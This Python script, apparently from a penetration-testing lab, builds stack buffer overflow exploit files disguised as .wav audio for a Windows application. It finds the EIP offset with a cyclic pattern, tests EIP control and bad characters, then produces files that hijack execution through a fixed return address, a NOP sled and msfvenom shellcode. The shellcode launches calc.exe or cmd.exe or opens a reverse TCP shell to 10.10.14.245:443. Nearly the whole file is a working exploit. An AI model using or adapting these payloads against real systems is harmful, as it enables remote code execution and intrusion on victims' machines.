from struct import pack

def eip_offset():
    #5000 bytes
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk",
                    "utf-8")

    with open('pattern.wav', 'wb') as f:
        f.write(payload)

def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
        0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
        0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
        0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
        0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
        0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
        0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
        0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
        0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
        0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
        0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
        0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
        0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
        0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
        0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
        0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
        0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
        0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
        0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
        0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

def calc():
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B) # <L = little endian
    nop = b"\x90"*32

    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xbe\x49\xaa\xca\xa5\xda\xdd\xd9\x74\x24\xf4\x5f"
    buf += b"\x31\xc9\xb1\x31\x83\xef\xfc\x31\x77\x0f\x03\x77"
    buf += b"\x46\x48\x3f\x59\xb0\x0e\xc0\xa2\x40\x6f\x48\x47"
    buf += b"\x71\xaf\x2e\x03\x21\x1f\x24\x41\xcd\xd4\x68\x72"
    buf += b"\x46\x98\xa4\x75\xef\x17\x93\xb8\xf0\x04\xe7\xdb"
    buf += b"\x72\x57\x34\x3c\x4b\x98\x49\x3d\x8c\xc5\xa0\x6f"
    buf += b"\x45\x81\x17\x80\xe2\xdf\xab\x2b\xb8\xce\xab\xc8"
    buf += b"\x08\xf0\x9a\x5e\x03\xab\x3c\x60\xc0\xc7\x74\x7a"
    buf += b"\x05\xed\xcf\xf1\xfd\x99\xd1\xd3\xcc\x62\x7d\x1a"
    buf += b"\xe1\x90\x7f\x5a\xc5\x4a\x0a\x92\x36\xf6\x0d\x61"
    buf += b"\x45\x2c\x9b\x72\xed\xa7\x3b\x5f\x0c\x6b\xdd\x14"
    buf += b"\x02\xc0\xa9\x73\x06\xd7\x7e\x08\x32\x5c\x81\xdf"
    buf += b"\xb3\x26\xa6\xfb\x98\xfd\xc7\x5a\x44\x53\xf7\xbd"
    buf += b"\x27\x0c\x5d\xb5\xc5\x59\xec\x94\x83\x9c\x62\xa3"
    buf += b"\xe1\x9f\x7c\xac\x55\xc8\x4d\x27\x3a\x8f\x51\xe2"
    buf += b"\x7f\x7f\x18\xaf\x29\xe8\xc5\x25\x68\x75\xf6\x93"
    buf += b"\xae\x80\x75\x16\x4e\x77\x65\x53\x4b\x33\x21\x8f"
    buf += b"\x21\x2c\xc4\xaf\x96\x4d\xcd\xd3\x79\xde\x8d\x3d"
    buf += b"\x1c\x66\x37\x42"

    payload = buffer + eip + nop + buf
    with open('calc.wav', 'wb') as f:
        f.write(payload)

def cmd():
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B) # <L = little endian
    nop = b"\x90"*32

    # msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xbd\x19\xc8\x67\x5e\xd9\xd0\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x31\x31\x68\x12\x83\xc0\x04\x03\x71"
    buf += b"\xc6\x85\xab\x7d\x3e\xcb\x54\x7d\xbf\xac\xdd\x98"
    buf += b"\x8e\xec\xba\xe9\xa1\xdc\xc9\xbf\x4d\x96\x9c\x2b"
    buf += b"\xc5\xda\x08\x5c\x6e\x50\x6f\x53\x6f\xc9\x53\xf2"
    buf += b"\xf3\x10\x80\xd4\xca\xda\xd5\x15\x0a\x06\x17\x47"
    buf += b"\xc3\x4c\x8a\x77\x60\x18\x17\xfc\x3a\x8c\x1f\xe1"
    buf += b"\x8b\xaf\x0e\xb4\x80\xe9\x90\x37\x44\x82\x98\x2f"
    buf += b"\x89\xaf\x53\xc4\x79\x5b\x62\x0c\xb0\xa4\xc9\x71"
    buf += b"\x7c\x57\x13\xb6\xbb\x88\x66\xce\xbf\x35\x71\x15"
    buf += b"\xbd\xe1\xf4\x8d\x65\x61\xae\x69\x97\xa6\x29\xfa"
    buf += b"\x9b\x03\x3d\xa4\xbf\x92\x92\xdf\xc4\x1f\x15\x0f"
    buf += b"\x4d\x5b\x32\x8b\x15\x3f\x5b\x8a\xf3\xee\x64\xcc"
    buf += b"\x5b\x4e\xc1\x87\x76\x9b\x78\xca\x1c\x5a\x0e\x71"
    buf += b"\x52\x5c\x10\x79\xc3\x35\x21\xf2\x8c\x42\xbe\xd1"
    buf += b"\xe8\xbd\xf4\x7b\x58\x56\x51\xee\xd8\x3b\x62\xc5"
    buf += b"\x1f\x42\xe1\xef\xdf\xb1\xf9\x9a\xda\xfe\xbd\x77"
    buf += b"\x97\x6f\x28\x77\x04\x8f\x79\x14\xc7\x0b\xac\xbf"
    buf += b"\x6f\xb1\xb0"

    payload = buffer + eip + nop + buf
    with open('cmd.wav', 'wb') as f:
        f.write(payload)


def reverse():
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B) # <L = little endian
    nop = b"\x90"*32

    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.245 LPORT=443 -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xbf\xa3\xda\xa7\x1c\xdb\xd3\xd9\x74\x24\xf4\x5d"
    buf += b"\x29\xc9\xb1\x52\x31\x7d\x12\x03\x7d\x12\x83\x66"
    buf += b"\xde\x45\xe9\x94\x37\x0b\x12\x64\xc8\x6c\x9a\x81"
    buf += b"\xf9\xac\xf8\xc2\xaa\x1c\x8a\x86\x46\xd6\xde\x32"
    buf += b"\xdc\x9a\xf6\x35\x55\x10\x21\x78\x66\x09\x11\x1b"
    buf += b"\xe4\x50\x46\xfb\xd5\x9a\x9b\xfa\x12\xc6\x56\xae"
    buf += b"\xcb\x8c\xc5\x5e\x7f\xd8\xd5\xd5\x33\xcc\x5d\x0a"
    buf += b"\x83\xef\x4c\x9d\x9f\xa9\x4e\x1c\x73\xc2\xc6\x06"
    buf += b"\x90\xef\x91\xbd\x62\x9b\x23\x17\xbb\x64\x8f\x56"
    buf += b"\x73\x97\xd1\x9f\xb4\x48\xa4\xe9\xc6\xf5\xbf\x2e"
    buf += b"\xb4\x21\x35\xb4\x1e\xa1\xed\x10\x9e\x66\x6b\xd3"
    buf += b"\xac\xc3\xff\xbb\xb0\xd2\x2c\xb0\xcd\x5f\xd3\x16"
    buf += b"\x44\x1b\xf0\xb2\x0c\xff\x99\xe3\xe8\xae\xa6\xf3"
    buf += b"\x52\x0e\x03\x78\x7e\x5b\x3e\x23\x17\xa8\x73\xdb"
    buf += b"\xe7\xa6\x04\xa8\xd5\x69\xbf\x26\x56\xe1\x19\xb1"
    buf += b"\x99\xd8\xde\x2d\x64\xe3\x1e\x64\xa3\xb7\x4e\x1e"
    buf += b"\x02\xb8\x04\xde\xab\x6d\x8a\x8e\x03\xde\x6b\x7e"
    buf += b"\xe4\x8e\x03\x94\xeb\xf1\x34\x97\x21\x9a\xdf\x62"
    buf += b"\xa2\xaf\x15\x62\xc7\xd8\x2b\x7a\x26\xa2\xa5\x9c"
    buf += b"\x42\xc4\xe3\x37\xfb\x7d\xae\xc3\x9a\x82\x64\xae"
    buf += b"\x9d\x09\x8b\x4f\x53\xfa\xe6\x43\x04\x0a\xbd\x39"
    buf += b"\x83\x15\x6b\x55\x4f\x87\xf0\xa5\x06\xb4\xae\xf2"
    buf += b"\x4f\x0a\xa7\x96\x7d\x35\x11\x84\x7f\xa3\x5a\x0c"
    buf += b"\xa4\x10\x64\x8d\x29\x2c\x42\x9d\xf7\xad\xce\xc9"
    buf += b"\xa7\xfb\x98\xa7\x01\x52\x6b\x11\xd8\x09\x25\xf5"
    buf += b"\x9d\x61\xf6\x83\xa1\xaf\x80\x6b\x13\x06\xd5\x94"
    buf += b"\x9c\xce\xd1\xed\xc0\x6e\x1d\x24\x41\x9e\x54\x64"
    buf += b"\xe0\x37\x31\xfd\xb0\x55\xc2\x28\xf6\x63\x41\xd8"
    buf += b"\x87\x97\x59\xa9\x82\xdc\xdd\x42\xff\x4d\x88\x64"
    buf += b"\xac\x6e\x99"

    payload = buffer + eip + nop + buf
    with open('reverse.wav', 'wb') as f:
        f.write(payload)


#eip_offset()
#eip_control()
#bad_chars()
#calc()
#cmd()
reverse()
